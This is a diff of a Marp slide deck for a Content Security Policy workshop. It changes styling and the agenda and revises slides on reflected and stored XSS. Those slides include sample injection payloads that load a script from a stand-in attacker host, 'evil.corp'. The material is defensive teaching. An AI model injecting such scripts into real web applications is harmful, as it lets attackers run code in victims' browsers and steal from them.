@@ -2,14 +2,14 @@
 marp: true
 size: 16:9
 theme: gaia
-footer: CSP - Workshop
+footer: AppSec Workshop - Content Security Policies
 paginate: true
 style: |
   section {
     background: #11133C;
     font-color: #F9EAD4;
   }
-  section {font-family: url('https://fonts.googleapis.com/css?family=Inter:400,500,700'); color: black; }
+  section {font-family: 'Inter'; color: black; }
   
   section.lead h1 {
     text-align: center;
@@ -22,17 +22,20 @@ style: |
   }
 
   section h1 {
-        font-size: 1.2rem;
-  }
-
-  section::before {
-    color: #F9EAD4;
+    font-size: 1.2rem;
   }
 
   section::after {
     content: attr(data-marpit-pagination) '/' attr(data-marpit-pagination-total);
-    font-size: 1.1rem;
+    font-size: 0.8rem;
     color: #F9EAD4;
+  }
+
+  section blockquote {
+    margin:auto;
+  }
+  section footer {
+    font-size: 0.3rem;
   }
 
 ---
@@ -40,26 +43,25 @@ style: |
 <!-- _class: lead -->
 # Content Security Policies<br>Workshop
 
->Security isn’t something you buy
->it’s something you do
+>Security isn’t something you buy it’s something you do!
 
 ---
 
 # Agenda
 
 ```
-09:00 - 10:00 - Why do we need CSP - the risk of injections
+09:00 - 09:30 - Why do we need CSP - the risk of injections
               - What is CSP
               - How can we use CSP
-00:00 - 00:00 - CSP directives:
-              - `default-src`
-              - `script-src` - `style-src` - `font-src`
-              - `connect-src`
-              - Media directives - `img-src` and `media-src`
-00:00 - 00:00 - Reporting URI - logging violation issues
-              - `report-uri` directive
+09:30 - 11:00 - CSP directives - with a ☕️ break :
+              - "default-src"
+              - "script-src" - "style-src" - "font-src"
+              - "connect-src"
+              - Media directives - "img-src" and "media-src"
+11:00 - 11:30 - Reporting URI - logging violation issues
+              - "report-uri" directive
               - Migration approach for your existing project
-00:00 - 00:00 - Summary
+11:45 - 12:00 - Summary
 ```
 
 ---
@@ -107,9 +109,10 @@ There are several types of XSS:
 
 ---
 
-# Reflected XSS attack
+# Reflected XSS attack - 1 / 2
 
 Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data.
+
 
 Example:
 ```html
@@ -118,16 +121,23 @@ https://insecure-web.com/comment?message=<script src=https//evil.corp/badscript.
 
 ---
 
-# Stored XSS attack
+![bg 70%](./resources/reflected_xss_diagram.png)
+
+---
+
+# Stored (persistent) XSS attack
 
 Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser.
 
-Comment field on a blog post:
-```
-Instead of a decent comment on the blog's input field, I write
-
+ Instead of a decent comment on the blog's input field, the attacker write:
+```html
 <script src='https//evil.corp/badscript.js'/>
 ```
+
+---
+
+![bg 70%](./resources/stored_persistent_xss.png)
+
 ---
 
 # Terms to help organize types of XSS - 1 / 2
@@ -178,7 +188,6 @@ neste what
 # Directive : `default-src`
 
 If a [`default-src`](https://www.w3.org/TR/CSP3/#directive-default-src) directive is present in a policy, its value will be used as the policy’s default source list. That is, given `default-src 'none';` `script-src 'self'`, script requests will use `'self'` as the source list to match against. Other requests will use `'none'`.
-
 Test code:
 ```html
 <head>
